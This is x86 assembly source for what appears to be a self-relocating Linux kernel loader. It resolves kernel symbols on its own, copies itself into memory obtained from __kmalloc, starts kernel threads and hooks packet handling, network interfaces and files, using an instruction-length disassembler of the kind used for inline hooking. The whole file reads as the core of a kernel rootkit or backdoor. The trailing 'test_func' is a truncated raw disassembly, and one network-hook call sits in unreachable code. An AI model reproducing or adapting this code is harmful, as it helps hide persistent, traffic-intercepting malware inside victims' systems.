#define EXPORT_LABEL(label) \
	.global label; label: 

#define GET_ADDR(label, reg) \
    call 999f;    \
    999: popl reg;    \
    subl $(999b - label), reg;

#define GET_VAL32(label, reg)	\
	GET_ADDR(label, reg);	\
	movl (reg), reg;	

#define GET_VAL64(label, r1, r2)	\
	GET_ADDR(label, r1);	\
	leal 0x4(r1), r2;	\
	movl (r1), r1;	\
	movl (r2), r2

#define SET_VAL32(label, val)	\
	GET_ADDR(label, %eax);	\
	movl val, (%eax);	

#define SET_VAL64(label, r1, r2)	\
	GET_ADDR(label, %eax);	\
	movl r1, (%eax);	\
	movl r2, 4(%eax);

#define GET_STR(str, reg)   \
    call 1111f;   \
    .asciz str; \
    1111: popl reg 

#define DPRINT(fmt)   \
    GET_ADDR(printk, %eax);    \
	movl (%eax), %eax;	\
    GET_STR(fmt, %edx); \
    movl %edx, (%esp);  \
    call *%eax;

#define GET_STRUCT_VAL32(base, offset, reg)	\
	GET_VAL32(offset, reg);	\
	movl 0(base, reg, 1), reg;

#define GET_STRUCT_VAL64(base, offset, r1, r2)	\
	GET_VAL32(offset, r1);	\
	leal 4(r1), r2;	\
	movl 0(base, r1, 1), r1;	\
	movl 0(base, r2, 1), r2;

#define SET_STRUCT_VAL32(base, offset, val)	\
	GET_VAL32(offset, %eax);	\
	movl val, 0(base, %eax, 1);	

#define SET_STRUCT_VAL64(base, offset, r1, r2)	\
	GET_VAL32(offset, %eax);	\
	movl r1, 0(base, %eax, 1);	\
	movl r2, 4(base, %eax, 1);

#define ERR_OUT(label)	\
	cmpl $0xFFFFF000, %eax;	\
	ja label

#define ERR_MAX 0xFFFFF000

#define PUSH_ALL	\
	pushl %ebx;	\
	pushl %ecx;	\
	pushl %edx;	\
	pushl %esi;	\
	pushl %edi;	\
	pushl %ebp;

#define POP_ALL	\
	popl %ebp;	\
	popl %edi;	\
	popl %esi;	\
	popl %edx;	\
	popl %ecx;	\
	popl %ebx;

#include "xde.inc"

.extern retcode

EXPORT_LABEL(loader_start)
	PUSH_ALL
    subl $0x20, %esp 

	call ksyms_init
	testl %eax, %eax
	jz loader_out

	call func_init
	testl %eax, %eax
	jz loader_out

#ifdef _DEBUG_
	GET_ADDR(loader_start, %eax)
	movl %eax, 4(%esp)
    DPRINT("<3>loader at %lx\n") 
#endif

	call kthread_init
	testl %eax, %eax
	jz loader_out

	call skb_init
	testl %eax, %eax
	jz loader_out

	call file_init
	testl %eax, %eax
	jz loader_out
	
	GET_VAL32(__kmalloc, %ebp)
	movl $(loader_end - loader_start), %eax
	movl $0xd0, %edx
	call *%ebp
	testl %eax, %eax
	jnz 1f
	movl $-1, retcode
	jmp loader_out
1:
	movl %eax, %ebp

	GET_ADDR(loader_start, %esi)
	movl %ebp, %edi
	movl $(loader_end - loader_start), %ecx
	cld; rep movsb
	
	leal (1f - loader_start)(%ebp), %eax
	jmp *%eax
1:
#ifdef _DEBUG_
	GET_ADDR(loader_start, %eax)
	movl %eax, 4(%esp)
    DPRINT("<3>loader reload at %lx\n") 
#endif

	call 1f
	.byte 2
	.long 1536, 2176
1:	popl %eax
	call inode_arg_to_dentry
	jmp loader_out

	call netif_hook_init
	cmpl $ERR_MAX, %eax
	ja loader_out

loader_out: 
    addl $0x20, %esp 
    POP_ALL
    ret 

#include "func.s"
#include "skb.s"
#include "netif_hook.s"
#include "xde.s"
#include "lib.s"
#include "ksym_lookup.s"
#include "kthread.s"
#include "file.s"



EXPORT_LABEL(loader_end) 



EXPORT_LABEL(test_func)
sub    $0x18,%esp       
mov    %esi,0xc(%esp)   
mov    %eax,%esi        
mov    %ebp,0x14(%esp)  
mov    %edx,%ebp        
mov    %ebx,0x8(%esp)   
mov    %edi,0x10(%esp)  
mov    %ecx,(%esp)      
mov    0xc(%eax),%eax   
mov    0xc(%eax),%edi   
mov    0x10(%esi),%eax  
test   %eax,%eax        
jne    1f             
mov    $0xffffffec,%ebx 
mov    %ebx,%eax        
mov    0xc(%esp),%esi   
mov    0x8(%esp),%ebx   
mov    0x10(%esp),%edi  
mov    0x14(%esp),%ebp  
add    $0x18,%esp       
ret                     
1:mov    0x18(%eax),%eax  
test   %eax,%eax        
je     0x27             
lea    0x70(%edi),%eax  
mov    $0xfffffffe,%ebx 
mov    %eax,0x4(%esp)   
call   0x14b500         
testb  $0x10,0x134(%edi)


EXPORT_LABEL(test_call)                            
	.byte 0x00; .long 0x000000FF; .long 0x00000075;
	.byte 'j'; .byte 0x01; .long 0x000000ff;       
	.byte 0x00; .long 0x000000FF; .long 0x0000008b;
	.byte 's'; .byte 0x02; .long 0x000000ff;       
	.byte 'e'                                      
